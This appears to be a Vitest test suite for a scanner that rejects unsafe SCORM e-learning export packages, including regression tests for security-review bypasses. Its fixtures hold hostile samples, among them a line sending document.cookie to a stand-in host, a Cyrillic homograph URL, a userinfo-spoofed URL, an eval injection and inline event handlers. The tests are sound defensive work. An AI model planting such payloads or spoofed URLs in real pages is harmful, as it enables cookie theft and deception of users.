import { describe, it, expect } from "vitest";
import { scanPackage, ScanContext } from "@/lib/export/scanner";
import { createHash } from "node:crypto";

const sha256 = (b: Buffer | string) => createHash("sha256").update(b).digest("hex");

const ENGINE_JS = Buffer.from("window.ILBEngine={mount:function(){}};");
const ENGINE_CSS = Buffer.from(".ilb-sandbox{}");
const SCORM_JS = Buffer.from("window.ILBScorm={mode:'standalone'};");

const goodConfig = {
  title: "T",
  inputs: [{ id: "x", label: "x", type: "slider", min: 0, max: 10, step: 1, defaultValue: 5 }],
  outputs: [{ id: "y", label: "y", formula: "x * 2" }],
  charts: [], challenges: [],
};

function ctx(overrides: Partial<ScanContext> = {}): ScanContext {
  return {
    engineChecksums: { "engine/engine.js": sha256(ENGINE_JS), "engine/engine.css": sha256(ENGINE_CSS), "engine/scorm-adapter.js": sha256(SCORM_JS) },
    urlAllowlist: [],
    authoringConfig: goodConfig,
    ...overrides,
  };
}

function goodPackage(): Map<string, Buffer> {
  return new Map<string, Buffer>([
    ["imsmanifest.xml", Buffer.from('<?xml version="1.0"?><manifest></manifest>')],
    ["index.html", Buffer.from('<!DOCTYPE html><html><head><link rel="stylesheet" href="engine/engine.css" /></head><body><script src="engine/engine.js"></script></body></html>')],
    ["engine/engine.js", ENGINE_JS],
    ["engine/engine.css", ENGINE_CSS],
    ["engine/scorm-adapter.js", SCORM_JS],
    ["content/config.json", Buffer.from(JSON.stringify({ ...goodConfig }))],
  ]);
}

describe("scanPackage", () => {
  it("passes a clean package", () => {
    const r = scanPackage(goodPackage(), ctx());
    expect(r.violations).toEqual([]);
    expect(r.passed).toBe(true);
  });

  it("blocks eval and new Function in any text file", () => {
    const p = goodPackage();
    p.set("content/config.json", Buffer.from(JSON.stringify({ ...goodConfig, title: 'x", eval(1), "' })));
    const r1 = scanPackage(p, ctx({ authoringConfig: JSON.parse(p.get("content/config.json")!.toString()) }));
    expect(r1.passed).toBe(false);
    expect(r1.violations.some((v) => v.rule === "forbidden-pattern" && /eval/.test(v.detail))).toBe(true);
  });

  it("blocks inline event handlers and javascript: urls in html", () => {
    const p = goodPackage();
    p.set("index.html", Buffer.from('<html><body onload="x()"><a href="javascript:alert(1)">x</a></body></html>'));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.filter((v) => v.rule === "forbidden-pattern").length).toBeGreaterThanOrEqual(2);
  });

  it("blocks off-allowlist URLs but allows allowlisted ones", () => {
    const p = goodPackage();
    p.set("content/config.json", Buffer.from(JSON.stringify({ ...goodConfig, intro: '<a href="https://evil.example/x">x</a>' })));
    const cfg = JSON.parse(p.get("content/config.json")!.toString());
    expect(scanPackage(p, ctx({ authoringConfig: cfg })).passed).toBe(false);
    expect(scanPackage(p, ctx({ authoringConfig: cfg, urlAllowlist: ["evil.example"] })).passed).toBe(true);
  });

  it("blocks tampered engine files (checksum mismatch)", () => {
    const p = goodPackage();
    p.set("engine/engine.js", Buffer.from("window.ILBEngine={mount:function(){}};//tampered"));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "checksum-mismatch")).toBe(true);
  });

  it("blocks unexpected file types", () => {
    const p = goodPackage();
    p.set("assets/evil.exe", Buffer.from("MZ"));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "file-type" && v.file === "assets/evil.exe")).toBe(true);
  });

  it("blocks iframes and external script srcs", () => {
    const p = goodPackage();
    p.set("index.html", Buffer.from('<html><body><iframe src="x.html"></iframe><script src="https://cdn.example/x.js"></script></body></html>'));
    const r = scanPackage(p, ctx());
    expect(r.violations.some((v) => /iframe/i.test(v.detail))).toBe(true);
  });

  it("blocks configs that fail schema revalidation", () => {
    const p = goodPackage();
    const bad = { ...goodConfig, outputs: [{ id: "y", label: "y", formula: "fetch(1)" }] };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "schema")).toBe(true);
  });

  it("blocks non-idempotent rich text (sanitizer disagreement)", () => {
    const p = goodPackage();
    const bad = { ...goodConfig, intro: '<p onclick="x()">hi</p>' };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad }));
    expect(r.passed).toBe(false);
  });

  // --- Security-review regression tests (bypasses C1/C2/C3/I1/I2 + index.html
  // audited-reference check + empty-engineChecksums) ---

  it("C1: blocks uppercase-scheme URLs (HTTPS://) that a case-sensitive regex would miss", () => {
    const p = goodPackage();
    const bad = { ...goodConfig, title: "HTTPS://evil.com" };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "url-allowlist" && /evil\.com/i.test(v.detail))).toBe(true);
  });

  it("C2: blocks IDN/non-ASCII-host URLs that an ASCII-only host regex would never match at all", () => {
    const p = goodPackage();
    // "а" is Cyrillic "а" (U+0430), not Latin "a" (U+0061) — an
    // ASCII-only capture group fails to match immediately after "://",
    // which previously caused the ENTIRE url-allowlist rule to find zero
    // matches for this text (not merely mis-extract the host).
    const bad = { ...goodConfig, title: "https://аpple.com" };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "url-allowlist" || v.rule === "invalid-url")).toBe(true);
  });

  it("C3: blocks userinfo-spoofed URLs using the real resolved hostname, not the userinfo", () => {
    const p = goodPackage();
    // Looks like "allowed.com" but the userinfo (before @) is not the host —
    // url.hostname correctly resolves this to "evil.com".
    const bad = { ...goodConfig, title: "https://allowed.com@evil.com/" };
    p.set("content/config.json", Buffer.from(JSON.stringify(bad)));
    const r = scanPackage(p, ctx({ authoringConfig: bad, urlAllowlist: ["allowed.com"] }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "url-allowlist" && /evil\.com/i.test(v.detail))).toBe(true);
  });

  it("I1: blocks a stray non-checksummed .js file regardless of its content (only audited code may execute)", () => {
    const p = goodPackage();
    p.set("content/tracker.js", Buffer.from("fetch('https://evil.example/collect?c='+document.cookie)"));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "unapproved-code-file" && v.file === "content/tracker.js")).toBe(true);
  });

  it("I2: blocks a (stray) .css file with a protocol-relative @import", () => {
    const p = goodPackage();
    p.set("content/x.css", Buffer.from("@import url(//evil.com/x.css);"));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "unapproved-code-file" && v.file === "content/x.css")).toBe(true);
    expect(r.violations.some((v) => v.rule === "forbidden-pattern" && /protocol-relative/i.test(v.detail))).toBe(true);
  });

  it("blocks index.html referencing a non-checksummed script path (audited-reference rule)", () => {
    const p = goodPackage();
    p.set("index.html", Buffer.from('<html><body><script src="content/tracker.js"></script></body></html>'));
    const r = scanPackage(p, ctx());
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "unapproved-code-file" && v.file === "index.html")).toBe(true);
  });

  it("blocks an empty (or shrunk) engineChecksums that omits required engine keys", () => {
    const r = scanPackage(goodPackage(), ctx({ engineChecksums: {} }));
    expect(r.passed).toBe(false);
    expect(r.violations.some((v) => v.rule === "missing-engine-checksum")).toBe(true);
  });
});
